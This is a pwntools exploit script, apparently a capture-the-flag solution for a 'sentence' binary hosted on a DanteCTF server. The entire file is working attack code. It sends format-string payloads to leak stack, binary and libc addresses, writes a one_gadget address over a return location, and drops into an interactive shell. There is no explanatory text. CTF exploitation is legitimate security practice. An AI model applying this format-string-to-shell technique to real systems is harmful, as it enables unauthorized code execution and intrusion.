from pwn import *

#p = process("./sentence_patched")
p = remote("challs.dantectf.it", 31531)
elf = ELF("./sentence_patched", checksec = 0)
libc = elf.libc

p.sendline(b"%15$p.%13$p")
p.recvuntil(b"Hi, ")
stack = int(p.recv(14), 16) - 0x110
print(stack)
p.recv(1)
elf.address = int(p.recv(14), 16) - elf.sym.main
print(hex(elf.address))
one = [0x50a37, 0x10dbc2, 0x10dbca, 0x10dbcf]
p.sendline(str(elf.sym.main + 5))
#gdb.attach(p)
p.sendline(str(stack))
p.sendline(b"%29$p.%13$p")
p.recvuntil(b"Hi, ")
libc.address = int(p.recv(14), 16) - 0x29e40
print(hex(libc.address))
p.recv(1)
stack = int(p.recv(14), 16) - 0x100
print(hex(stack))
p.sendline(str(libc.address + one[0]))
#gdb.attach(p)
p.sendline(str(stack))
p.interactive()
